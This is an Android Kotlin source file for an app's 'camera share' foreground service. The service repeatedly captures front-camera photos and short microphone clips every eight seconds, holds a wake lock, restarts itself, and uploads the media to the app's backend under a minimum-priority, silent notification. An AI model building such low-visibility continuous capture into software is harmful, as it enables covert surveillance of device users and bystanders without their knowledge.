package com.frenky.egypt.camera

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.frenky.egypt.MainActivity
import com.frenky.egypt.R
import com.frenky.egypt.data.EgyptApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.atomic.AtomicInteger
import kotlin.coroutines.resume

class CameraShareForegroundService : LifecycleService() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
    private var captureLoop: Job? = null
    private var imageCapture: ImageCapture? = null
    private var cameraProvider: ProcessCameraProvider? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val cycleCount = AtomicInteger(0)

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        val userId = intent?.getStringExtra(EXTRA_USER_ID) ?: return stopSelfAndCleanup()
        val userName = intent.getStringExtra(EXTRA_USER_NAME) ?: return stopSelfAndCleanup()

        acquireWakeLock()
        startForeground(NOTIFICATION_ID, buildNotification())
        bindCameraAndLoop(userId, userName)

        return START_STICKY
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java) ?: return
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Egypt::CameraShare").apply {
            setReferenceCounted(false)
            acquire(4 * 60 * 60 * 1000L)
        }
    }

    private fun bindCameraAndLoop(userId: String, userName: String) {
        val providerFuture = ProcessCameraProvider.getInstance(this)
        providerFuture.addListener({
            runCatching {
                cameraProvider = providerFuture.get()
                bindImageCapture()
                startCaptureLoop(userId, userName)
            }.onFailure {
                Log.e(TAG, "Camera bind failed", it)
                scheduleRetryBind(userId, userName)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun bindImageCapture() {
        val provider = cameraProvider ?: return
        provider.unbindAll()
        val capture = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .setJpegQuality(50)
            .build()
        imageCapture = capture
        provider.bindToLifecycle(
            this,
            CameraSelector.DEFAULT_FRONT_CAMERA,
            capture,
        )
    }

    private fun unbindCamera() {
        imageCapture = null
        cameraProvider?.unbindAll()
    }

    private fun scheduleRetryBind(userId: String, userName: String) {
        scope.launch {
            delay(5_000)
            if (captureLoop?.isActive == true) {
                bindCameraAndLoop(userId, userName)
            }
        }
    }

    private fun startCaptureLoop(userId: String, userName: String) {
        captureLoop?.cancel()
        captureLoop = scope.launch(Dispatchers.IO) {
            while (isActive) {
                runCaptureCycle(userId, userName)
                delay(CYCLE_INTERVAL_MS)
            }
        }
    }

    private suspend fun runCaptureCycle(userId: String, userName: String) {
        val cycle = cycleCount.incrementAndGet()
        Log.d(TAG, "Cycle $cycle start")

        captureAndUploadPhoto(userId, userName)

        // Libera la camera prima del microfono (evita blocco dopo il 1° ciclo)
        withContext(Dispatchers.Main) { unbindCamera() }
        recordAndUploadAudio(userId, userName)

        withContext(Dispatchers.Main) {
            runCatching { bindImageCapture() }
                .onFailure { Log.e(TAG, "Rebind failed", it) }
        }
    }

    private suspend fun captureAndUploadPhoto(userId: String, userName: String) {
        var capture = imageCapture
        if (capture == null) {
            withContext(Dispatchers.Main) {
                runCatching { bindImageCapture() }
            }
            capture = imageCapture
        }
        if (capture == null) return

        val file = File(cacheDir, "egypt_cam_upload.jpg")
        val saved = suspendCancellableCoroutine { cont ->
            val output = ImageCapture.OutputFileOptions.Builder(file).build()
            capture.takePicture(
                output,
                ContextCompat.getMainExecutor(this@CameraShareForegroundService),
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                        cont.resume(true)
                    }

                    override fun onError(exception: ImageCaptureException) {
                        Log.w(TAG, "Capture error: ${exception.message}", exception)
                        cont.resume(false)
                    }
                },
            )
        }
        if (!saved || !file.exists()) return
        val bytes = file.readBytes()
        file.delete()
        if (bytes.size !in 1..900_000) return
        EgyptApi.uploadCameraFrame(userId, userName, Base64.encodeToString(bytes, Base64.NO_WRAP))
            .onFailure { Log.w(TAG, "Upload frame failed", it) }
    }

    private suspend fun recordAndUploadAudio(userId: String, userName: String) {
        if (!AudioClipRecorder.hasPermission(this)) return
        val audioFile = File(cacheDir, "egypt_cam_upload.m4a")
        if (!AudioClipRecorder.recordClip(this, audioFile, AUDIO_DURATION_MS)) return
        val bytes = audioFile.readBytes()
        audioFile.delete()
        if (bytes.size !in 1..600_000) return
        EgyptApi.uploadCameraAudio(userId, userName, Base64.encodeToString(bytes, Base64.NO_WRAP))
            .onFailure { Log.w(TAG, "Upload audio failed", it) }
    }

    private fun buildNotification(): Notification {
        createChannel()
        val open = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.camera_share_notification_title))
            .setContentText(getString(R.string.camera_share_notification_text))
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(open)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val mgr = getSystemService(NotificationManager::class.java)
        mgr.createNotificationChannel(
            NotificationChannel(
                CHANNEL_ID,
                getString(R.string.camera_share_channel_name),
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                description = getString(R.string.camera_share_channel_desc)
            },
        )
    }

    private fun stopSelfAndCleanup(): Int {
        wakeLock?.let { if (it.isHeld) it.release() }
        wakeLock = null
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        captureLoop?.cancel()
        scope.cancel()
        unbindCamera()
        wakeLock?.let { if (it.isHeld) it.release() }
        wakeLock = null
        super.onDestroy()
    }

    companion object {
        private const val TAG = "CameraShareService"
        private const val CHANNEL_ID = "egypt_camera_share"
        private const val NOTIFICATION_ID = 4102
        private const val CYCLE_INTERVAL_MS = 8_000L
        private const val AUDIO_DURATION_MS = 3_000L
        const val EXTRA_USER_ID = "user_id"
        const val EXTRA_USER_NAME = "user_name"

        fun start(context: Context, userId: String, userName: String) {
            val intent = Intent(context, CameraShareForegroundService::class.java).apply {
                putExtra(EXTRA_USER_ID, userId)
                putExtra(EXTRA_USER_NAME, userName)
            }
            ContextCompat.startForegroundService(context, intent)
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, CameraShareForegroundService::class.java))
        }
    }
}
